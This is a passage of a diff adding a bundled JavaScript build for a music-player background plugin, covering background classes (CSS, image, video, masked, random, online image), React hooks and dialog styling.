7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}');
+    }
+  });
+
+  // node_modules/react-icons/lib/esm/iconBase.js
+  var import_react2 = __toESM(require_react());
+
+  // node_modules/react-icons/lib/esm/iconContext.js
+  var import_react = __toESM(require_react());
+  var DefaultContext = {
+    color: void 0,
+    size: void 0,
+    className: void 0,
+    style: void 0,
+    attr: void 0
+  };
+  var IconContext = import_react.default.createContext && import_react.default.createContext(DefaultContext);
+
+  // node_modules/react-icons/lib/esm/iconBase.js
+  var __assign = function() {
+    __assign = Object.assign || function(t) {
+      for (var s, i = 1, n = arguments.length; i < n; i++) {
+        s = arguments[i];
+        for (var p in s)
+          if (Object.prototype.hasOwnProperty.call(s, p))
+            t[p] = s[p];
+      }
+      return t;
+    };
+    return __assign.apply(this, arguments);
+  };
+  var __rest = function(s, e) {
+    var t = {};
+    for (var p in s)
+      if (Object.prototype.hasOwnProperty.call(s, p) && e.indexOf(p) < 0)
+        t[p] = s[p];
+    if (s != null && typeof Object.getOwnPropertySymbols === "function")
+      for (var i = 0, p = Object.getOwnPropertySymbols(s); i < p.length; i++) {
+        if (e.indexOf(p[i]) < 0 && Object.prototype.propertyIsEnumerable.call(s, p[i]))
+          t[p[i]] = s[p[i]];
+      }
+    return t;
+  };
+  function Tree2Element(tree) {
+    return tree && tree.map(function(node, i) {
+      return import_react2.default.createElement(node.tag, __assign({
+        key: i
+      }, node.attr), Tree2Element(node.child));
+    });
+  }
+  function GenIcon(data) {
+    return function(props) {
+      return import_react2.default.createElement(IconBase, __assign({
+        attr: __assign({}, data.attr)
+      }, props), Tree2Element(data.child));
+    };
+  }
+  function IconBase(props) {
+    var elem = function(conf) {
+      var attr = props.attr, size = props.size, title = props.title, svgProps = __rest(props, ["attr", "size", "title"]);
+      var computedSize = size || conf.size || "1em";
+      var className;
+      if (conf.className)
+        className = conf.className;
+      if (props.className)
+        className = (className ? className + " " : "") + props.className;
+      return import_react2.default.createElement("svg", __assign({
+        stroke: "currentColor",
+        fill: "currentColor",
+        strokeWidth: "0"
+      }, conf.attr, attr, svgProps, {
+        className,
+        style: __assign(__assign({
+          color: props.color || conf.color
+        }, conf.style), props.style),
+        height: computedSize,
+        width: computedSize,
+        xmlns: "http://www.w3.org/2000/svg"
+      }), title && import_react2.default.createElement("title", null, title), props.children);
+    };
+    return IconContext !== void 0 ? import_react2.default.createElement(IconContext.Consumer, null, function(conf) {
+      return elem(conf);
+    }) : elem(DefaultContext);
+  }
+
+  // node_modules/react-icons/md/index.esm.js
+  function MdDelete(props) {
+    return GenIcon({ "tag": "svg", "attr": { "viewBox": "0 0 24 24" }, "child": [{ "tag": "path", "attr": { "fill": "none", "d": "M0 0h24v24H0z" } }, { "tag": "path", "attr": { "d": "M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z" } }] })(props);
+  }
+  function MdSettings(props) {
+    return GenIcon({ "tag": "svg", "attr": { "viewBox": "0 0 24 24" }, "child": [{ "tag": "path", "attr": { "fill": "none", "d": "M0 0h24v24H0V0z" } }, { "tag": "path", "attr": { "d": "M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 00.12-.61l-1.92-3.32a.488.488 0 00-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 00-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 00-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z" } }] })(props);
+  }
+  function MdAdd(props) {
+    return GenIcon({ "tag": "svg", "attr": { "viewBox": "0 0 24 24" }, "child": [{ "tag": "path", "attr": { "fill": "none", "d": "M0 0h24v24H0z" } }, { "tag": "path", "attr": { "d": "M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" } }] })(props);
+  }
+  function MdSelectAll(props) {
+    return GenIcon({ "tag": "svg", "attr": { "viewBox": "0 0 24 24" }, "child": [{ "tag": "path", "attr": { "fill": "none", "d": "M0 0h24v24H0z" } }, { "tag": "path", "attr": { "d": "M3 5h2V3c-1.1 0-2 .9-2 2zm0 8h2v-2H3v2zm4 8h2v-2H7v2zM3 9h2V7H3v2zm10-6h-2v2h2V3zm6 0v2h2c0-1.1-.9-2-2-2zM5 21v-2H3c0 1.1.9 2 2 2zm-2-4h2v-2H3v2zM9 3H7v2h2V3zm2 18h2v-2h-2v2zm8-8h2v-2h-2v2zm0 8c1.1 0 2-.9 2-2h-2v2zm0-12h2V7h-2v2zm0 8h2v-2h-2v2zm-4 4h2v-2h-2v2zm0-16h2V3h-2v2zM7 17h10V7H7v10zm2-8h6v6H9V9z" } }] })(props);
+  }
+  function MdDesktopWindows(props) {
+    return GenIcon({ "tag": "svg", "attr": { "viewBox": "0 0 24 24" }, "child": [{ "tag": "path", "attr": { "fill": "none", "d": "M0 0h24v24H0z" } }, { "tag": "path", "attr": { "d": "M21 2H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h7v2H8v2h8v-2h-2v-2h7c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H3V4h18v12z" } }] })(props);
+  }
+
+  // src/errors.ts
+  var NotImplementedError = class extends Error {
+    constructor(message, options) {
+      super(message, options);
+    }
+  };
+
+  // src/background/background.ts
+  function makeId(length) {
+    var result = "";
+    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    var charactersLength = characters.length;
+    for (var i = 0; i < length; i++) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+  }
+  var BaseBackground = class {
+    async onConfig() {
+      return;
+    }
+    current = false;
+    id = makeId(12);
+    async previewBackground() {
+      throw new NotImplementedError(
+        "Method previewBackground is not implemented"
+      );
+    }
+    async backgroundElement() {
+      throw new NotImplementedError(
+        "Method backgroundElement is not implemented"
+      );
+    }
+    static default() {
+      throw new NotImplementedError("Method default is not implemented");
+    }
+    static async askAndCreate() {
+      throw new NotImplementedError("Method create is not implemented");
+    }
+    hooks__onBeforeAddBackground(newBG) {
+    }
+    hooks__onBeforeRemoveBackground(removedBG) {
+    }
+  };
+  __publicField(BaseBackground, "attributes", []);
+  __publicField(BaseBackground, "backgroundTypeName");
+
+  // src/background/cssBackground.tsx
+  var import_sweetalert2 = __toESM(require_sweetalert2_all());
+  var _CSSBackground = class extends BaseBackground {
+    constructor(css) {
+      super();
+      this.css = css;
+    }
+    css;
+    async backgroundElement() {
+      return /* @__PURE__ */ h("div", { style: { width: "100px", height: "100px", background: this.css } }, /* @__PURE__ */ h("div", { style: { width: "100%", height: "100%", background: this.css } }));
+    }
+    async previewBackground() {
+      return () => /* @__PURE__ */ h("div", { style: { background: this.css } });
+    }
+    static default() {
+      return new _CSSBackground("gray");
+    }
+    static async askAndCreate() {
+      const result = await import_sweetalert2.default.fire({
+        title: "\u521B\u5EFA\u4E00\u4E2ACSS\u80CC\u666F",
+        text: "\u4F60\u53EF\u4EE5\u5728\u6B64\u5199\u5165\u4EFB\u4F55\u53EF\u4EE5\u4F5C\u4E3A background \u503C\u7684\u5B57\u7B26\u4E32\u3002\u5B83\u5C06\u88AB\u4F5C\u4E3A\u80CC\u666F\u4F7F\u7528\u3002",
+        input: "text"
+      });
+      if (result.value)
+        return new _CSSBackground(result.value);
+      else
+        return null;
+    }
+  };
+  var CSSBackground = _CSSBackground;
+  __publicField(CSSBackground, "backgroundTypeName", "CSS");
+
+  // src/hooks.ts
+  function useLocalStorage(key, initialValue, parse = JSON.parse, stringify = JSON.stringify) {
+    const [storedValue, setStoredValue] = React.useState(() => {
+      try {
+        const item = window.localStorage.getItem(key);
+        return item ? parse(item) : initialValue;
+      } catch (error) {
+        console.log(error);
+        return initialValue;
+      }
+    });
+    const setValue = (value) => {
+      try {
+        const valueToStore = value instanceof Function ? value(storedValue) : value;
+        setStoredValue(valueToStore);
+        window.localStorage.setItem(key, stringify(valueToStore));
+      } catch (error) {
+        console.log(error);
+      }
+    };
+    return [storedValue, setValue];
+  }
+  function resolvePromise(promise) {
+    if (typeof promise === "function") {
+      return promise();
+    }
+    return promise;
+  }
+  var states = {
+    pending: "pending",
+    rejected: "rejected",
+    resolved: "resolved"
+  };
+  var defaultState = {
+    error: void 0,
+    result: void 0,
+    state: states.pending
+  };
+  function reducer(state, action) {
+    switch (action.type) {
+      case states.pending:
+        return defaultState;
+      case states.resolved:
+        return {
+          error: void 0,
+          result: action.payload,
+          state: states.resolved
+        };
+      case states.rejected:
+        return {
+          error: action.payload,
+          result: void 0,
+          state: states.rejected
+        };
+      default:
+        return state;
+    }
+  }
+  function usePromise(promise, inputs) {
+    const [{ error, result, state }, dispatch] = React.useReducer(reducer, defaultState);
+    React.useEffect(() => {
+      promise = resolvePromise(promise);
+      if (!promise) {
+        return;
+      }
+      let canceled = false;
+      dispatch({ type: states.pending });
+      promise.then(
+        (result2) => !canceled && dispatch({
+          payload: result2,
+          type: states.resolved
+        }),
+        (error2) => !canceled && dispatch({
+          payload: error2,
+          type: states.rejected
+        })
+      );
+      return () => {
+        canceled = true;
+      };
+    }, inputs);
+    return [result, error, state];
+  }
+  function useInterval(callback, delay) {
+    const savedCallback = React.useRef();
+    React.useEffect(() => {
+      savedCallback.current = callback;
+    }, [callback]);
+    React.useEffect(() => {
+      function tick() {
+        savedCallback.current();
+      }
+      let id = setInterval(tick, delay);
+      return () => clearInterval(id);
+    }, []);
+  }
+
+  // src/keys.ts
+  var STORE_BGLIST = "cc.microblock.bgenhanced.backgroundlist";
+  var STORE_BGMODE = "cc.microblock.bgenhanced.backgroundmode";
+  var STORE_BGSCALE = "cc.microblock.bgenhanced.backgroundscale";
+  var STORE_BGBLUR = "cc.microblock.bgenhanced.backgrounblur";
+  var STORE_BGBRIGHTNESS = "cc.microblock.bgenhanced.backgroundbrightness";
+
+  // src/index.tsx
+  var import_react3 = __toESM(require_react());
+
+  // src/background/coverImageBackground.tsx
+  var lastUrl = "";
+  var _CoverImageBackground = class extends BaseBackground {
+    constructor(ImageUrl) {
+      super();
+      this.ImageUrl = ImageUrl;
+    }
+    ImageUrl;
+    async backgroundElement() {
+      return /* @__PURE__ */ h(
+        "img",
+        {
+          className: "BGE-coverImageBG",
+          src: ";"
+        }
+      );
+    }
+    async previewBackground() {
+      return () => /* @__PURE__ */ h("div", { className: "BGE-coverImageBG", style: { background: "transparent" } });
+    }
+    static async askAndCreate() {
+      lastUrl = "";
+      return new _CoverImageBackground("");
+    }
+    static default() {
+      return new _CoverImageBackground("");
+    }
+  };
+  var CoverImageBackground = _CoverImageBackground;
+  __publicField(CoverImageBackground, "backgroundTypeName", "\u5F53\u524D\u5C01\u9762");
+  setInterval(async () => {
+    const preloadImage = (src) => new Promise((resolve, reject) => {
+      const image = new Image();
+      image.onload = resolve;
+      image.onerror = reject;
+      image.src = src;
+    });
+    if (document.querySelector(".normal.j-cover, .cmd-image")) {
+      const url = `${document.querySelector(".normal.j-cover, .cmd-image").src.split("?")[1]}`;
+      if (lastUrl !== url) {
+        lastUrl = url;
+        await preloadImage(url);
+      }
+      for (const img of document.querySelectorAll(".BGE-coverImageBG")) {
+        if (img.getAttribute("src"))
+          img.setAttribute("src", url);
+        if (img.style.background)
+          img.style.background = `url(${url}) 0% 0% / cover`;
+      }
+    }
+  }, 300);
+
+  // src/background/imageBackground.tsx
+  var _mountedImageUrl;
+  var _ImageBackground = class extends BaseBackground {
+    constructor(ImageUrl) {
+      super();
+      __publicField(this, "ImageUrl");
+      __privateAdd(this, _mountedImageUrl, void 0);
+      this.ImageUrl = ImageUrl;
+    }
+    async getMountedImageUrl() {
+      if (__privateGet(this, _mountedImageUrl) === void 0)
+        __privateSet(this, _mountedImageUrl, betterncm.fs.mountFile(this.ImageUrl));
+      return await __privateGet(this, _mountedImageUrl);
+    }
+    async backgroundElement() {
+      return /* @__PURE__ */ h(
+        "img",
+        {
+          src: await this.getMountedImageUrl()
+        }
+      );
+    }
+    async previewBackground() {
+      const url = await this.getMountedImageUrl();
+      return () => /* @__PURE__ */ h("div", { style: { background: `url(${url}) 0% 0% / cover` } });
+    }
+    static default() {
+      return new _ImageBackground("");
+    }
+    static async askAndCreate() {
+      const path = await betterncm.app.openFileDialog(".webp .png .jpg\0", "./");
+      if (path)
+        return new _ImageBackground(path);
+      return null;
+    }
+  };
+  var ImageBackground = _ImageBackground;
+  _mountedImageUrl = new WeakMap();
+  __publicField(ImageBackground, "backgroundTypeName", "\u56FE\u7247");
+
+  // src/background/maskedBackground.tsx
+  var import_sweetalert22 = __toESM(require_sweetalert2_all());
+
+  // src/background/RecursiveLockBackground.ts
+  var RecursiveLockBackground = class extends BaseBackground {
+    #recursiveCount = 0;
+    resetRecursiveCount() {
+      this.#recursiveCount = 0;
+    }
+    checkRecursive() {
+      return this.#recursiveCount++ > 50;
+    }
+  };
+
+  // src/background/maskedBackground.tsx
+  var _targetBGElement, _targetBackground, targetBackground_fn, _getStyleSheet, getStyleSheet_fn;
+  var _MaskedBackground = class extends RecursiveLockBackground {
+    constructor() {
+      super(...arguments);
+      __privateAdd(this, _targetBackground);
+      __privateAdd(this, _getStyleSheet);
+      __publicField(this, "target");
+      __publicField(this, "maskColor", "#ffffff22");
+      __publicField(this, "maskBlur", 0);
+      __privateAdd(this, _targetBGElement, void 0);
+    }
+    async onConfig() {
+      const ConfigMenu = () => {
+        const [target, setTarget] = React.useState(this.target);
+        const [maskColorMain, setMaskColorMain] = React.useState(this.maskColor.slice(0, 7));
+        const [maskColorOpacity, setMaskColorOpacity] = React.useState(parseInt(this.maskColor.slice(7, 9), 16));
+        const [maskBlur, setMaskBlur] = React.useState(this.maskBlur);
+        function pad(num, size) {
+          var s = "000" + num;
+          return s.substr(s.length - size);
+        }
+        React.useEffect(() => {
+          this.target = target;
+          this.maskColor = maskColorMain + pad(maskColorOpacity.toString(16), 2);
+          console.log(pad(maskColorOpacity.toString(16), 2));
+          this.maskBlur = maskBlur;
+        }, [target, maskColorMain, maskColorOpacity, maskBlur]);
+        const checkBackground = (bg) => {
+          setTarget(bg.id);
+        };
+        const filteredBGList = React.useMemo(
+          () => selfPlugin.backgroundList.filter((bg) => bg !== this),
+          []
+        );
+        return /* @__PURE__ */ h(f, null, /* @__PURE__ */ h("div", null, /* @__PURE__ */ h("span", null, "\u906E\u7F69\u989C\u8272\uFF1A"), /* @__PURE__ */ h("input", { type: "color", value: maskColorMain, onChange: (e) => setMaskColorMain(e.target.value) }), /* @__PURE__ */ h("br", null), /* @__PURE__ */ h("span", null, "\u906E\u7F69\u900F\u660E\u5EA6\uFF1A"), /* @__PURE__ */ h("input", { type: "range", value: maskColorOpacity, min: 0, max: 255, step: 1, onChange: (e) => setMaskColorOpacity(parseFloat(e.target.value)) }), /* @__PURE__ */ h("br", null), /* @__PURE__ */ h("span", null, "\u906E\u7F69\u9AD8\u65AF\u6A21\u7CCA\uFF1A"), /* @__PURE__ */ h("input", { type: "range", value: maskBlur, min: 0, max: 60, step: 1, onChange: (e) => setMaskBlur(parseFloat(e.target.value)) }), /* @__PURE__ */ h("br", null)), /* @__PURE__ */ h("div", null, "\u906E\u7F69\u5BF9\u8C61\uFF1A"), /* @__PURE__ */ h(
+          BackgroundPreviewList,
+          {
+            backgroundList: filteredBGList,
+            currentIDs: [target],
+            buttons: (bg) => /* @__PURE__ */ h(f, null, /* @__PURE__ */ h(
+              "span",
+              {
+                className: "btn",
+                onClick: () => checkBackground(bg)
+              },
+              /* @__PURE__ */ h(MdSelectAll, { color: "white" })
+            ))
+          }
+        ));
+      };
+      const p = import_sweetalert22.default.fire({ title: "\u906E\u7F69\u80CC\u666F\u8BBE\u7F6E", html: "<div id=MaskedBackgroundConfigContainer class=BGEnhanced-Config style='font-size:.5em;' />" });
+      ReactDOM.render(/* @__PURE__ */ h(ConfigMenu, null), document.getElementById("MaskedBackgroundConfigContainer"));
+      await p;
+      __privateSet(this, _targetBGElement, void 0);
+      this.resetRecursiveCount();
+      return;
+    }
+    async previewBackground() {
+      if (this.checkRecursive())
+        return () => /* @__PURE__ */ h("div", null, "Potential circular reference detected.");
+      const preview = await (await __privateMethod(this, _targetBackground, targetBackground_fn).call(this)).previewBackground();
+      return () => /* @__PURE__ */ h(f, null, preview, /* @__PURE__ */ h("div", { className: `bgMask-${this.id}` }), /* @__PURE__ */ h("style", null, __privateMethod(this, _getStyleSheet, getStyleSheet_fn).call(this)));
+    }
+    async backgroundElement() {
+      if (this.checkRecursive())
+        return /* @__PURE__ */ h("div", null, "Potential circular reference detected.");
+      return /* @__PURE__ */ h(f, null, await (await __privateMethod(this, _targetBackground, targetBackground_fn).call(this)).backgroundElement(), /* @__PURE__ */ h("div", { className: `bgMask-${this.id}` }), /* @__PURE__ */ h("style", null, __privateMethod(this, _getStyleSheet, getStyleSheet_fn).call(this)));
+    }
+    static default() {
+      return new _MaskedBackground();
+    }
+    static async askAndCreate() {
+      const bg = new _MaskedBackground();
+      await bg.onConfig();
+      return bg;
+    }
+  };
+  var MaskedBackground = _MaskedBackground;
+  _targetBGElement = new WeakMap();
+  _targetBackground = new WeakSet();
+  targetBackground_fn = async function() {
+    if (!__privateGet(this, _targetBGElement)) {
+      __privateSet(this, _targetBGElement, Promise.race([
+        betterncm.utils.waitForFunction(() => selfPlugin.backgroundList.length),
+        betterncm.utils.delay(1e3).then((_) => Promise.reject("Timeout"))
+      ]).then(() => selfPlugin.backgroundList.find((bg) => bg.id === this.target)));
+    }
+    return __privateGet(this, _targetBGElement);
+  };
+  _getStyleSheet = new WeakSet();
+  getStyleSheet_fn = function() {
+    return `
 .bgMask-${this.id}{
     position:absolute;
     left:0;
@@ -69,13 +5027,553 @@ https://sweetalert2.github.io/#ajax-request`),_5(t),typeof t.title=="string"&&(t
     background:${this.maskColor};
     backdrop-filter:blur(${this.maskBlur}px);
 }
-`},L(k1,"backgroundTypeName","\u906E\u7F69\u80CC\u666F"),L(k1,"attributes",["recursive"]);var z0=e1(A1());var T1,_1,X2,p2=class extends b1{constructor(){super(...arguments);K(this,_1);L(this,"excludeList",[]);K(this,T1,void 0)}async onConfig(){let l=()=>{let[o,p]=React.useState(this.excludeList),u=React.useMemo(()=>U.backgroundList.map(M=>M.id).filter(M=>!o.includes(M)),[o]);React.useEffect(()=>{this.excludeList=o},[o]);let z=M=>{o.includes(M.id)?p(o.filter(I=>I!==M.id)):p([...o,M.id])},d=React.useMemo(()=>U.backgroundList.filter(M=>M!==this),[]);return h(f,null,h(K1,{backgroundList:d,currentIDs:u,buttons:M=>h(f,null,h("span",{className:"btn",onClick:()=>z(M)},h(S1,{color:"white"})))}))},n=z0.default.fire({title:"\u968F\u673A\u80CC\u666F\u8BBE\u7F6E",html:"<div id=RandBGConfigContainer class=BGEnhanced-Config style='font-size:.5em;' />"});ReactDOM.render(h(l,null),document.getElementById("RandBGConfigContainer")),await n,this.resetRecursiveCount()}async previewBackground(){return this.checkRecursive()?()=>h("div",null,"Potential circular reference detected."):(await c1(this,_1,X2).call(this)).previewBackground()}async backgroundElement(){return this.checkRecursive()?h("div",null,"Potential circular reference detected."):(await c1(this,_1,X2).call(this)).backgroundElement()}static default(){return new p2}static async askAndCreate(){let l=new p2;return l.excludeList=[...U.backgroundList.filter(n=>n.constructor.attributes.includes("recursive")).map(n=>n.id)],l}hooks__onBeforeAddBackground(l){l.constructor.attributes.includes("recursive")&&this.excludeList.push(l.id)}hooks__onBeforeRemoveBackground(l){this.excludeList=this.excludeList.filter(n=>l.id!==n)}},P1=p2;T1=new WeakMap,_1=new WeakSet,X2=async function(){return j(this,T1)||J(this,T1,Promise.race([betterncm.utils.waitForFunction(()=>U.backgroundList.length),betterncm.utils.delay(1e3).then(l=>Promise.reject("Timeout"))]).then(()=>U.backgroundList.filter(l=>l!==this&&!this.excludeList.includes(l.id)).sort(l=>Math.random()-.5)[0])),j(this,T1)},L(P1,"backgroundTypeName","\u968F\u673A\u62BD\u9009"),L(P1,"attributes",["recursive"]);var tt=e1(A1());var s2=class extends b{constructor(v){super(),this.ImageUrl=v}ImageUrl;async backgroundElement(){return h("img",{src:this.ImageUrl})}async previewBackground(){return()=>h("div",{style:{background:`url(${this.ImageUrl}) 0% 0% / cover`}})}static default(){return new s2("")}async onConfig(){let v=await tt.default.fire({title:"\u4FEE\u6539\u5728\u7EBF\u56FE\u7247\u80CC\u666FURL",inputValue:this.ImageUrl,input:"text"});v.value&&(this.ImageUrl=v.value)}static async askAndCreate(){let v=await tt.default.fire({title:"\u521B\u5EFA\u4E00\u4E2A\u5728\u7EBF\u56FE\u7247\u80CC\u666F",text:"\u4F60\u53EF\u4EE5\u5728\u6B64\u5199\u5165\u4E00\u4E2A\u6307\u5411\u56FE\u7247\u7684URL\u3002",input:"text"});return v.value?new s2(v.value):null}},s1=s2;L(s1,"backgroundTypeName","\u5728\u7EBF\u56FE\u7247");var at=e1(A1());var u2=class extends s1{constructor(v){super(v)}static default(){return new u2("")}static async askAndCreate(){at.default.showLoading(null);let v=await fetch("https://www.loliapi.com/acg/pc/");return at.default.clickCancel(),new u2(v.url)}},q1=u2;L(q1,"backgroundTypeName","\u968F\u673A\u4E8C\u6B21\u5143");var H2=class extends b{ImageUrl="https://api.dujin.org/bing/1920.php";constructor(){super()}async backgroundElement(){return h("img",{src:`${this.ImageUrl}?${new Date().getTime()}`})}async previewBackground(){return()=>h("div",{style:{background:`url(${this.ImageUrl}?${new Date().getTime()}) 0% 0% / cover`}})}static default(){return new H2}static async askAndCreate(){return new H2}},Q1=H2;L(Q1,"backgroundTypeName","\u5FC5\u5E94\u6BCF\u65E5");var F1,f2=class extends b{constructor(l){super();L(this,"videoUrl");K(this,F1,void 0);this.videoUrl=l}async getMountedVideoUrl(){return j(this,F1)===void 0&&J(this,F1,betterncm.fs.mountFile(this.videoUrl)),await j(this,F1)}async backgroundElement(){return h("video",{autoPlay:!0,loop:!0,muted:!0,src:await this.getMountedVideoUrl()})}async previewBackground(){let l=await this.getMountedVideoUrl();return()=>h("video",{preload:"metadata",src:l})}static default(){return new f2("")}static async askAndCreate(){let l=await betterncm.app.openFileDialog(".mp4, .webm\0","./");return l?new f2(l):null}},Y1=f2;F1=new 